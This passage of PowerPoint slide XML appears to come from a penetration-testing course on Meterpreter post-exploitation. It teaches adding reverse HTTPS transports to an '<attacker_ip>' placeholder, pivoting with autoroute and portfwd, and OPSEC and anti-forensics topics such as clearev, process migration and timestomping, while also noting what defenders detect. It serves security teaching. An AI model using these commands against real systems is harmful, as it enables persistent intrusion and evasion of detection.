              <a:t>) in Meterpreter is a powerful technique for increasing connection reliability, bypassing network restrictions, or ensuring persistence during a penetration test.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>In modern Metasploit, this is primarily managed through the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>transports</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> command, which allows you to add, remove, and switch between different communication methods (e.g., HTTP, HTTPS, TCP, SMB) on a single session.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="358109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FFE05-A0FC-70EC-09F6-551F57C17597}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="628650" y="934578"/>
            <a:ext cx="7886700" cy="481267"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Contd..</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8AEB855C-60B1-5BD8-C1D6-8419932E7DF3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="628650" y="1514168"/>
            <a:ext cx="7886700" cy="4831453"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Key Concepts for Multi-Channel Communication</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Primary Transport:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> The method currently being used to communicate with the C2 (Command &amp; Control) server.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Transport List:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> A prioritized list of transport mechanisms that the payload will cycle through if the primary connection fails.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Pivot/Relay:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> Using an existing compromised host to reach internal network segments that the attacker cannot reach directly.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="41731579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31803-1157-30C5-15FD-81BC0D27B80B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="628650" y="934578"/>
            <a:ext cx="7886700" cy="481267"/>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id="{8279A76F-1E68-C6A4-8200-C60AC431156C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="628650" y="1533832"/>
            <a:ext cx="7886700" cy="4811789"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="55000" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>How to Manage Transports</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Inside an active Meterpreter session, you can use the transports command to manage your channels.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>1. View Current Configuration</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>To see which transport you are currently using and the list of backup transports, use:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Bash</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>meterpreter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> &gt; transport list</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>2. Add a New Transport</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>You can add a new transport to the list to ensure the session remains active even if one port or protocol is blocked. For example, to add an HTTPS listener:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Bash</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>meterpreter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> &gt; transport add -t </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>reverse_https</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> -l &lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>attacker_ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>&gt; -p &lt;port&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>3. Change Active Transport</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>If you need to force the session to switch to a specific communication channel (e.g., moving from a noisy TCP connection to a stealthier HTTPS connection):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Bash</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>meterpreter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> &gt; transport set &lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>transport_id</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="24481417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A4E51-ECB9-5BB3-B118-53423F56F70A}"/>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FAB60635-F84D-230E-E722-56C711B83939}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="55000" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Leveraging Pivoting for Multiple Channels</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>When you need to reach targets behind a firewall, you do not necessarily need a new "channel" to the internet; you need to extend the reach of your existing session through </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Pivoting</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Identify the Network:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> Once you have a shell on a compromised host, use ipconfig or </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>arp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> to identify internal subnets.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Add a Route:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> Tell Metasploit to route traffic destined for that internal subnet through your current session:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Bash</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>meterpreter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> &gt; run autoroute -s 192.168.1.0/24</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0" err="1"/>
              <a:t>Portfwd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> For specific service access, you can forward a local port on your machine to a port on a target machine inside the network:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Bash</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>meterpreter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> &gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>portfwd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> add -l 8080 -p 80 -r 192.168.1.50</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" i="1" dirty="0"/>
              <a:t>This creates a new communication channel from your local machine to the internal target through the Meterpreter tunnel.</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="41857950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794BF-5D1E-0F73-5329-7E8B27AC2B5C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Meterpreter anti-forensics</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{ECEB12CE-40B2-A0FE-8EBA-FEC8DF9C5A55}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="92500" lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Meterpreter is designed for in-memory, post-exploitation operations, which inherently provides some level of "anti-forensic" capability by avoiding disk-based signatures. However, modern Endpoint Detection and Response (EDR) and advanced logging systems are highly effective at detecting the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>behaviors</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> associated with these activities.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>In a professional penetration testing or red team context, "anti-forensics" is largely about maintaining </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Operational Security (OPSEC)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> and minimizing the trail left behind.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="8873361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9BAFC-9A6E-359A-63DE-A86E6950E669}"/>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5DE189D3-70D8-ED4B-F3F2-E6BA7EBA53AA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="70000" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Understanding the Forensic Trail</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Even though Meterpreter operates in memory, it leaves distinct artifacts:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Process Injection:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> Meterpreter injects into a host process. Modern EDRs monitor for suspicious </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>CreateRemoteThread</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> or </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>NtMapViewOfSection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> calls, which are common indicators of injection.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0" err="1"/>
              <a:t>Behavioral</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t> Anomalies:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> Activities like dumping credentials (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>mimikatz</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>/kiwi), scanning the network, or clearing logs trigger </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>behavioral</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> heuristics.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Encrypted C2 Traffic:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> While the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" i="1" dirty="0"/>
              <a:t>content</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> is encrypted, the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" i="1" dirty="0"/>
              <a:t>pattern</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> of beaconing (regular check-ins) can be identified by network traffic analysis (NTA) tools.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Log Artifacts:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> Clearing logs is itself a massive red flag. Deleting or clearing Event Logs (using </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>clearev</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>) creates an "Audit Log Cleared" event (Event ID 1102 on Windows), which is a high-priority alert for any security operations </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>center</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="15290844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2D5AD-3747-CE9D-3C25-16921CC6C5EE}"/>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773F4DE-7FBF-2E5F-EE0B-3133AEB61468}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="47500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Operational Security (OPSEC) Strategies</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>To minimize your footprint during an authorized engagement, consider these defensive-minded approaches rather than traditional "anti-forensics":</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>1. Avoid "Cleanup" if Possible</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Commands like </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>clearev</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> are essentially "loud" indicators of compromise. In many professional assessments, it is better to avoid creating the logs in the first place rather than trying to delete them later. Focus on:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Minimalism:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> Run only the modules necessary for your specific engagement objectives.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Living-off-the-Land (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0" err="1"/>
              <a:t>LotL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>):</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> Use native system tools (e.g., net, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>powershell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> with constrained language mode, wmic) instead of loading external Meterpreter extensions that might be flagged.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>2. Process Migration</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Meterpreter can migrate to a more stable or stealthy process.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Avoid:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> Migrating into processes that are highly monitored or volatile (like explorer.exe or temporary processes).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Strategy:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> Select a long-running, stable process that matches the architecture of your payload (e.g., svchost.exe).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Command:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> migrate &lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>pid</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="8434308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52255-C3FE-CD57-D693-396577665C5C}"/>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DA39864F-5A2A-AAF2-B934-8A2FFFCECFC3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="62500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>3. Handling Files and Payloads</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>If you must drop files:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0" err="1"/>
              <a:t>Timestomping</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> While commonly discussed, simple timestamp manipulation is easily detected by comparing $FILE_NAME vs $STANDARD_INFORMATION attributes in the NTFS Master File Table (MFT).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Temporary Locations:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> Avoid writing to sensitive directories (e.g., System32, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>AppData</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>). Always clean up after yourself if a file is absolutely required for a task, but recognize that file creation/deletion events are logged.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>4. Managing Communication (C2)</a:t>
            </a:r>
          </a:p>
          <a:p>
